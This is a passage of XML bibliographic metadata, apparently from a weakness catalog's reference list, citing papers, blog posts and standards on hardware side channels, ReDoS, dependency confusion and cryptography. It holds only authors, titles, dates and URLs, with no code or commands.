			<ns0:Author>David Hely</ns0:Author>
			<ns0:Author>Ramesh Karri</ns0:Author>
			<ns0:Title>Secure and Flexible Trace-Based Debugging of Systems-on-Chip</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:URL>https://dl.acm.org/doi/pdf/10.1145/2994601</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1152">
			<ns0:Author>Trusted Computing Group</ns0:Author>
			<ns0:Title>TCG Roots of Trust Specification</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:URL>https://trustedcomputinggroup.org/wp-content/uploads/TCG_Roots_of_Trust_Specification_v0p20_PUBLIC_REVIEW.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1153">
			<ns0:Author>GlobalPlatform Security Task Force</ns0:Author>
			<ns0:Title>Root of Trust Definitions and Requirements</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:URL>https://globalplatform.org/wp-content/uploads/2018/06/GP_RoT_Definitions_and_Requirements_v1.0.1_PublicRelease_CC.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1154">
			<ns0:Author>National Institute of Standards and Technology</ns0:Author>
			<ns0:Title>NIST Special Publication 800-88 Revision 1: Guidelines for Media Sanitization</ns0:Title>
			<ns0:Publication_Year>2014</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:URL>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-88r1.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1155">
			<ns0:Author>Hassan M. G. Wassel, Ying Gao, Jason K. Oberg, Tedd Huffmire, Ryan Kastner, Frederic T. Chong, Timothy Sherwood</ns0:Author>
			<ns0:Title>SurfNoC: A Low Latency and Provably Non-Interfering Approach to Secure Networks-On-Chip</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:URL>http://cseweb.ucsd.edu/~kastner/papers/isca13-surfNOC.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1156">
			<ns0:Author>Leonid Grustniy</ns0:Author>
			<ns0:Title>Loapi--This Trojan is hot!</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:URL>https://www.kaspersky.com/blog/loapi-trojan/20510/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1158">
			<ns0:Author>Akond Rahman</ns0:Author>
			<ns0:Author>Md Rayhanur Rahman</ns0:Author>
			<ns0:Author>Chris Parnin</ns0:Author>
			<ns0:Author>Laurie Williams</ns0:Author>
			<ns0:Title>Security Smells in Ansible and Chef Scripts: A Replication Study</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://arxiv.org/pdf/1907.07159.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1159">
			<ns0:Author>Akond Rahman</ns0:Author>
			<ns0:Author>Chris Parnin</ns0:Author>
			<ns0:Author>Laurie Williams</ns0:Author>
			<ns0:Title>The Seven Sins: Security Smells in Infrastructure as Code Scripts</ns0:Title>
			<ns0:Publication>ICSE '19: Proceedings of the 41st International Conference on Software Engineering</ns0:Publication>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:URL>https://dl.acm.org/doi/10.1109/ICSE.2019.00033</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1161">
			<ns0:Author>Josep Balasch</ns0:Author>
			<ns0:Author>Benedikt Gierlichs</ns0:Author>
			<ns0:Author>Ingrid Verbauwhede</ns0:Author>
			<ns0:Title>An In-depth and Black-box Characterization of the Effects of Clock Glitches on 8-bit MCUs</ns0:Title>
			<ns0:Publication>2011 Workshop on Fault Diagnosis and Tolerance in Cryptography (IEEE)</ns0:Publication>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:URL>https://ieeexplore.ieee.org/document/6076473</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1162">
			<ns0:Author>Jan Goyvaerts</ns0:Author>
			<ns0:Title>Runaway Regular Expressions: Catastrophic Backtracking</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:URL>https://www.regular-expressions.info/catastrophic.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1163">
			<ns0:Author>Adar Weidman</ns0:Author>
			<ns0:Title>Regular expression Denial of Service - ReDoS</ns0:Title>
			<ns0:URL>https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1164">
			<ns0:Author>Ilya Kantor</ns0:Author>
			<ns0:Title>Catastrophic backtracking</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://javascript.info/regexp-catastrophic-backtracking</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1165">
			<ns0:Author>Cristian-Alexandru Staicu</ns0:Author>
			<ns0:Author>Michael Pradel</ns0:Author>
			<ns0:Title>Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers</ns0:Title>
			<ns0:Publication>USENIX Security Symposium</ns0:Publication>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-staicu.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1166">
			<ns0:Author>James C. Davis</ns0:Author>
			<ns0:Author>Christy A. Coghlan</ns0:Author>
			<ns0:Author>Francisco Servant</ns0:Author>
			<ns0:Author>Dongyoon Lee</ns0:Author>
			<ns0:Title>The Impact of Regular Expression Denial of Service (ReDoS) in Practice: An Empirical Study at the Ecosystem Scale</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:URL>https://fservant.github.io/papers/Davis_Coghlan_Servant_Lee_ESECFSE18.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1167">
			<ns0:Author>James Davis</ns0:Author>
			<ns0:Title>The Regular Expression Denial of Service (ReDoS) cheat-sheet</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:URL>https://levelup.gitconnected.com/the-regular-expression-denial-of-service-redos-cheat-sheet-a78d0ed7d865</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1168">
			<ns0:Author>Catalin Cimpanu</ns0:Author>
			<ns0:Title>Microsoft warns enterprises of new 'dependency confusion' attack technique</ns0:Title>
			<ns0:Publication>ZDNet</ns0:Publication>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---10</ns0:Publication_Day>
			<ns0:URL>https://www.zdnet.com/article/microsoft-warns-enterprises-of-new-dependency-confusion-attack-technique/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1169">
			<ns0:Author>Alex Birsan</ns0:Author>
			<ns0:Title>Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---09</ns0:Publication_Day>
			<ns0:URL>https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1170">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>3 Ways to Mitigate Risk When Using Private Package Feeds</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---09</ns0:Publication_Day>
			<ns0:URL>https://azure.microsoft.com/mediahandler/files/resourcefiles/3-ways-to-mitigate-risk-using-private-package-feeds/3%20Ways%20to%20Mitigate%20Risk%20When%20Using%20Private%20Package%20Feeds%20-%20v1.0.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1171">
			<ns0:Author>Matthew Green</ns0:Author>
			<ns0:Title>Why IND-CPA implies randomized encryption</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:URL>https://blog.cryptographyengineering.com/why-ind-cpa-implies-randomized-encryption/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1172">
			<ns0:Author>NIST</ns0:Author>
			<ns0:Title>Recommendation for Block Cipher Modes of Operation</ns0:Title>
			<ns0:Publication_Year>2001</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:URL>https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1175">
			<ns0:Author>Nikita Borisov</ns0:Author>
			<ns0:Author>Ian Goldberg</ns0:Author>
			<ns0:Author>David Wagner</ns0:Author>
			<ns0:Title>Intercepting Mobile Communications: The Insecurity of 802.11</ns0:Title>
			<ns0:Publication>Proceedings of the Seventh Annual International Conference on Mobile Computing And Networking</ns0:Publication>
			<ns0:Publication_Year>2001</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publisher>ACM</ns0:Publisher>
			<ns0:URL>http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1176">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Birthday problem</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---06</ns0:Publication_Day>
			<ns0:URL>https://en.wikipedia.org/wiki/Birthday_problem</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1177">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Initialization Vector</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---08</ns0:Publication_Day>
			<ns0:URL>https://en.wikipedia.org/wiki/Initialization_vector</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1178">
			<ns0:Author>NIST</ns0:Author>
			<ns0:Title>Recommendation for Block Cipher Modes of Operation: Galois/Counter Mode (GCM) and GMAC</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:URL>https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1179">
			<ns0:Author>Arxum Path Security</ns0:Author>
			<ns0:Title>CBC Mode is Malleable. Don't trust it for Authentication</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>https://arxumpathsecurity.com/blog/2019/10/16/cbc-mode-is-malleable-dont-trust-it-for-authentication</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1180">
			<ns0:Author>Scott A. Crosby</ns0:Author>
			<ns0:Title>Regular Expression Denial of Service</ns0:Title>
			<ns0:Publication_Year>2003</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:URL>https://web.archive.org/web/20031120114522/http://www.cs.rice.edu/~scrosby/hash/slides/USENIX-RegexpWIP.2.ppt</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1181">
			<ns0:Author>Nikolaos Athanasios Anagnostopoulos</ns0:Author>
			<ns0:Author>Tolga Arul</ns0:Author>
			<ns0:Author>Markus Rosenstihl</ns0:Author>
			<ns0:Author>Andr&#233; Schaller</ns0:Author>
			<ns0:Author>Sebastian Gabmeyer</ns0:Author>
			<ns0:Author>Stefan Katzenbeisser</ns0:Author>
			<ns0:Title>Low-Temperature Data Remnanence Attacks Against Intrinsic SRAM PUFs</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>https://ieeexplore.ieee.org/abstract/document/8491873/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1182">
			<ns0:Author>Yuan Cao</ns0:Author>
			<ns0:Author>Yunyi Guo</ns0:Author>
			<ns0:Author>Benyu Liu</ns0:Author>
			<ns0:Author>Wei Ge</ns0:Author>
			<ns0:Author>Min Zhu</ns0:Author>
			<ns0:Author>Chip-Hong Chang</ns0:Author>
			<ns0:Title>A Fully Digital Physical Unclonable Function Based Temperature Sensor for Secure Remote Sensing</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://ieeexplore.ieee.org/abstract/document/8487347/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1183">
			<ns0:Author> Urbi Chatterjee</ns0:Author>
			<ns0:Author> Soumi Chatterjee</ns0:Author>
			<ns0:Author> Debdeep Mukhopadhyay</ns0:Author>
			<ns0:Author> Rajat Subhra Chakraborty</ns0:Author>
			<ns0:Title>Machine Learning Assisted PUF Calibration for Trustworthy Proof of Sensor Data in IoT</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:URL>https://dl.acm.org/doi/abs/10.1145/3393628</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1184">
			<ns0:Author>Wikipedia</ns0:Author>
			<ns0:Title>Power Analysis</ns0:Title>
			<ns0:URL>https://en.wikipedia.org/wiki/Power_analysis</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1186">
			<ns0:Title>Is COBOL holding you hostage with Math?</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:URL>https://medium.com/the-technical-archaeologist/is-cobol-holding-you-hostage-with-math-5498c0eb428b</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1187">
			<ns0:Title>Intermediate results and arithmetic precision</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---30</ns0:Publication_Day>
			<ns0:URL>https://www.ibm.com/docs/en/cobol-zos/6.2?topic=appendixes-intermediate-results-arithmetic-precision</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1188">
			<ns0:Title>8.1.2. Arbitrary Precision Numbers</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:URL>https://www.postgresql.org/docs/8.3/datatype-numeric.html#DATATYPE-NUMERIC-DECIMAL</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1189">
			<ns0:Title>Muller's Recurrence</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://scipython.com/blog/mullers-recurrence/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1190">
			<ns0:Title>An Improvement To Floating Point Numbers</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:URL>https://hackaday.com/2015/10/22/an-improvement-to-floating-point-numbers/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1191">
			<ns0:Title>HIGH PERFORMANCE COMPUTING:  ARE WE JUST GETTING WRONG ANSWERS FASTER?</ns0:Title>
			<ns0:Publication_Year>1999</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:URL>https://www3.nd.edu/~markst/cast-award-speech.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1192">
			<ns0:Author>Information Technology Laboratory, National Institute of Standards and Technology</ns0:Author>
			<ns0:Title>FIPS PUB 140-3: SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC MODULES</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:URL>https://csrc.nist.gov/publications/detail/fips/140/3/final</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1193">
			<ns0:Author>James Kettle</ns0:Author>
			<ns0:Title>Server-Side Template Injection</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://portswigger.net/research/server-side-template-injection</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1194">
			<ns0:Author>James Kettle</ns0:Author>
			<ns0:Title>Server-Side Template Injection: RCE For The Modern Web App</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---27</ns0:Publication_Day>
			<ns0:URL>https://www.youtube.com/watch?v=3cT0uE7Y87s</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1197">
			<ns0:Author>Health Care Industry Cybersecurity Task Force</ns0:Author>
			<ns0:Title>Report on Improving Cybersecurity in the
			Health Care Industry</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:URL>https://www.phe.gov/Preparedness/planning/CyberTF/Documents/report2017.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1198">
			<ns0:Title>close - Perldoc Browser</ns0:Title>
			<ns0:URL>https://perldoc.perl.org/functions/close</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1199">
			<ns0:Title>io - Core tools for working with streams &#8212; Python 3.9.7 documentation</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---02</ns0:Publication_Day>
			<ns0:URL>https://docs.python.org/3.9/library/io.html#io.IOBase.close</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1200">
			<ns0:Title>FileOutputStream (Java Platform SE 7 )</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:URL>https://docs.oracle.com/javase/7/docs/api/java/io/FileOutputStream.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1201">
			<ns0:Title>FileOutputStream (Java SE 11 &amp; JDK 11 )</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:URL>https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/FileOutputStream.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1202">
			<ns0:Author>Jo Van Bulck, Daniel Moghimi, Michael Schwarz, Moritz Lipp, Marina Minkin, Daniel Genkin, Yuval Yarom, Berk Sunar, Daniel Gruss, and Frank Piessens</ns0:Author>
			<ns0:Title>LVI - Hijacking Transient Execution with Load Value Injection</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:URL>https://lviattack.eu/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1203">
			<ns0:Author>Jo Van Bulck, Daniel Moghimi, Michael Schwarz, Moritz Lipp, Marina Minkin, Daniel Genkin, Yuval Yarom, Berk Sunar, Daniel Gruss, and Frank Piessens</ns0:Author>
			<ns0:Title>LVI: Hijacking Transient Execution through Microarchitectural Load Value Injection</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---09</ns0:Publication_Day>
			<ns0:URL>https://lviattack.eu/lvi.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1204">
			<ns0:Title>Hijacking Transient Execution through Microarchitectural Load Value Injection</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---18</ns0:Publication_Day>
			<ns0:URL>https://www.youtube.com/watch?v=99kVz-YGi6Y</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1205">
			<ns0:Author>Stephan van Schaik, Marina Minkin, Andrew Kwong, Daniel Genkin, Yuval Yarom</ns0:Author>
			<ns0:Title>CacheOut: Leaking Data on Intel CPUs via Cache Evictions</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:URL>https://cacheoutattack.com/files/CacheOut.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1212">
			<ns0:Title>A06:2021 - Vulnerable and Outdated Components</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:Publisher>OWASP</ns0:Publisher>
			<ns0:URL>https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1217">
			<ns0:Author>Ross Anderson</ns0:Author>
			<ns0:Title>Security Engineering</ns0:Title>
			<ns0:Publication_Year>2001</ns0:Publication_Year>
			<ns0:URL>https://www.cl.cam.ac.uk/~rja14/musicfiles/manuscripts/SEv1.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1218">
			<ns0:Author>Graham Cluley</ns0:Author>
			<ns0:Title>This Black Box Can Brute Force Crack iPhone PIN Passcodes</ns0:Title>
			<ns0:Publication>The Mac Security Blog</ns0:Publication>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>https://www.intego.com/mac-security-blog/iphone-pin-pass-code/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1219">
			<ns0:Author>Monodeep Kar</ns0:Author>
			<ns0:Author>Arvind Singh</ns0:Author>
			<ns0:Author>Santosh Ghosh</ns0:Author>
			<ns0:Author>Sanu Mathew</ns0:Author>
			<ns0:Author>Anand Rajan</ns0:Author>
			<ns0:Author>Vivek De</ns0:Author>
			<ns0:Author>Raheem Beyah</ns0:Author>
			<ns0:Author>Saibal Mukhopadhyay</ns0:Author>
			<ns0:Title>Blindsight: Blinding EM Side-Channel Leakage using Built-In Fully Integrated Inductive Voltage Regulator</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:URL>https://arxiv.org/pdf/1802.09096.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1220">
			<ns0:Author>Zhenyu Ning</ns0:Author>
			<ns0:Author>Fengwei Zhang</ns0:Author>
			<ns0:Title>Understanding the Security of ARM Debugging Features</ns0:Title>
			<ns0:Publication>2019 IEEE Symposium on Security and Privacy (SP)</ns0:Publication>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:URL>https://www.computer.org/csdl/proceedings-article/sp/2019/666000b156/19skgcwSgsE</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1221">
			<ns0:Author>Victor Lomne</ns0:Author>
			<ns0:Author>Thomas Roche</ns0:Author>
			<ns0:Title>A Side Journey to Titan</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---07</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20210107182441/https://ninjalab.io/wp-content/uploads/2021/01/a_side_journey_to_titan.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1222">
			<ns0:Author>Alexandre Menu</ns0:Author>
			<ns0:Author>Jean-Max Dutertre</ns0:Author>
			<ns0:Author>Olivier Potin</ns0:Author>
			<ns0:Author>Jean-Baptiste Rigaud</ns0:Author>
			<ns0:Title>Experimental Analysis of the Electromagnetic Instruction Skip Fault Model</ns0:Title>
			<ns0:Publication>IEEE Xplore</ns0:Publication>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---30</ns0:Publication_Day>
			<ns0:URL>https://ieeexplore.ieee.org/document/9081261</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1223">
			<ns0:Author>Niek Timmers</ns0:Author>
			<ns0:Author>Albert Spruyt</ns0:Author>
			<ns0:Author>Marc Witteman</ns0:Author>
			<ns0:Title>Controlling PC on ARM using Fault Injection</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://fdtc.deib.polimi.it/FDTC16/shared/FDTC-2016-session_2_1.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1224">
			<ns0:Author>Colin O'Flynn</ns0:Author>
			<ns0:Title>Attacking USB Gear with EMFI</ns0:Title>
			<ns0:Publication>Circuit Cellar</ns0:Publication>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:URL>https://www.totalphase.com/media/pdf/whitepapers/Circuit_Cellar_TP.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1225">
			<ns0:Author>Project Zero</ns0:Author>
			<ns0:Title>Exploiting the DRAM rowhammer bug to gain kernel privileges</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---09</ns0:Publication_Day>
			<ns0:URL>https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1226">
			<ns0:Author>Information Technology Laboratory, National Institute of Standards and Technology</ns0:Author>
